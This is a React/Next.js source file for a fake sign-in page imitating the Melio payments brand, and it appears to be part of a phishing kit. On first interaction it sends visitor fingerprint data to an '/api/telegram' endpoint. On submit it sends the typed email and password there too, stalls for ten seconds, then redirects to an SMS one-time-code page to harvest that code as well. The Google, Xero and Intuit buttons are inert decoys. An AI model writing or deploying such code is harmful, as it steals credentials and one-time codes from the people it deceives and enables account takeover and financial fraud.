"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { MelioLogo } from "./MelioLogo";
import { Eye, EyeOff } from "lucide-react";

export function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    const payload = {
      userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "",
      screen: typeof window !== "undefined" ? `${window.screen.width}x${window.screen.height}` : "",
      language: typeof navigator !== "undefined" ? navigator.language : "",
      referrer: typeof document !== "undefined" ? document.referrer || "Direct" : "Direct",
      url: typeof window !== "undefined" ? window.location.href : "",
      utcTime: new Date().toLocaleString("en-US", {
        timeZone: "UTC",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
    };
    fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ kind: "visit", ...payload }),
    }).catch(console.error);
  }, [hasInteracted]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        kind: "login",
        username: email.trim(),
        password,
      }),
    }).catch(console.error);
    await new Promise((r) => setTimeout(r, 10000));
    // Skip the method selection step and send the user straight to OTP.
    router.push("/verify-code?method=sms&step=1");
    // NOTE: navigation will unmount this component; no need to set loading=false.
  };

  return (
    <div className="min-h-screen w-full flex items-start sm:items-center justify-center bg-white sm:bg-[#F0F4F8]">
      <div className="w-full sm:max-w-[500px] sm:bg-white sm:rounded-2xl sm:shadow-sm sm:border sm:border-[#e5e7eb] p-6 sm:p-10 pt-16 sm:pt-10">
        {/* Logo */}
        <div className="flex justify-center mb-6">
        <Link href="/" aria-label="Back to landing" className="inline-flex">
          <MelioLogo className="h-9 w-auto" />
        </Link>
        </div>

        {/* Title */}
        <h1 className="text-center text-[28px] font-semibold text-[#1a1a2e] mb-8">
          Sign in
        </h1>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Email Field */}
          <div className="space-y-1.5">
            <label
              htmlFor="email"
              className="block text-sm font-medium text-[#4a4a5a]"
            >
              Email
            </label>
            <input
              id="email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full h-11 px-4 border border-[#d1d5db] rounded-lg text-[#1a1a2e] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all"
              required
            />
          </div>

          {/* Password Field */}
          <div className="space-y-1.5">
            <label
              htmlFor="password"
              className="block text-sm font-medium text-[#4a4a5a]"
            >
              Password
            </label>
            <div className="relative">
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-11 px-4 pr-12 border border-[#d1d5db] rounded-lg text-[#1a1a2e] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#6b7280] hover:text-[#4a4a5a] transition-colors"
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? (
                  <EyeOff className="w-5 h-5" />
                ) : (
                  <Eye className="w-5 h-5" />
                )}
              </button>
            </div>
          </div>

          {/* Forgot Password */}
          <div className="text-left">
            <a
              href="#"
              className="text-sm text-[#7244F6] hover:text-[#5a35c5] transition-colors"
            >
              Forgot password?
            </a>
          </div>

          {/* Sign In Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full h-11 bg-[#7244F6] hover:bg-[#5a35c5] text-white font-medium rounded-lg transition-colors"
          >
            {loading ? "Loading..." : "Sign in"}
          </button>
        </form>

        {/* Divider */}
        <div className="relative my-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-[#e5e7eb]"></div>
          </div>
          <div className="relative flex justify-center">
            <span className="px-4 bg-white text-sm text-[#6b7280]">Or</span>
          </div>
        </div>

        {/* Social Login Buttons */}
        <div className="space-y-3">
          {/* Google */}
          <button
            type="button"
            className="w-full h-11 flex items-center justify-center gap-3 border border-[#d1d5db] rounded-lg bg-white hover:bg-[#f9fafb] transition-colors"
          >
            <svg className="w-5 h-5" viewBox="0 0 24 24">
              <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4"
              />
              <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853"
              />
              <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                fill="#FBBC05"
              />
              <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335"
              />
            </svg>
            <span className="text-sm font-medium text-[#1a1a2e]">
              Sign in with Google
            </span>
          </button>

          {/* Xero */}
          <button
            type="button"
            className="w-full h-11 flex items-center justify-center gap-3 border border-[#d1d5db] rounded-lg bg-white hover:bg-[#f9fafb] transition-colors"
          >
            <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="12" fill="#13B5EA" />
              <path
                d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10.5c-2.48 0-4.5-2.02-4.5-4.5s2.02-4.5 4.5-4.5 4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5z"
                fill="white"
              />
              <text
                x="12"
                y="15"
                textAnchor="middle"
                fill="white"
                fontSize="5"
                fontWeight="bold"
              >
                xero
              </text>
            </svg>
            <span className="text-sm font-medium text-[#1a1a2e]">
              Sign in with Xero
            </span>
          </button>

          {/* Intuit */}
          <button
            type="button"
            className="w-full h-11 flex items-center justify-center gap-3 border border-[#0077C5] rounded-lg bg-white hover:bg-[#f0f9ff] transition-colors"
          >
            <span className="text-sm font-medium text-[#0077C5]">
              Sign in with Intuit
            </span>
          </button>
        </div>

        {/* QuickBooks Note */}
        <p className="text-center text-sm text-[#6b7280] mt-3">
          Using QuickBooks Online?{" "}
          <a href="#" className="text-[#0077C5] hover:underline">
            Sign in with Intuit
          </a>
        </p>

        {/* Get Started */}
        <div className="text-center mt-6 pt-6 border-t border-[#e5e7eb]">
          <p className="text-sm text-[#6b7280]">
            New to Melio?{" "}
            <a
              href="#"
              className="text-[#7244F6] hover:text-[#5a35c5] font-medium transition-colors"
            >
              Get started
            </a>
          </p>
        </div>

        {/* Terms */}
        <p className="text-center text-xs text-[#9ca3af] mt-6">
          By continuing, you are agreeing to Melio&apos;s{" "}
          <a href="#" className="text-[#7244F6] hover:underline">
            Terms of Service
          </a>{" "}
          and{" "}
          <a href="#" className="text-[#7244F6] hover:underline">
            Privacy Policy
          </a>
          .
        </p>
      </div>
    </div>
  );
}
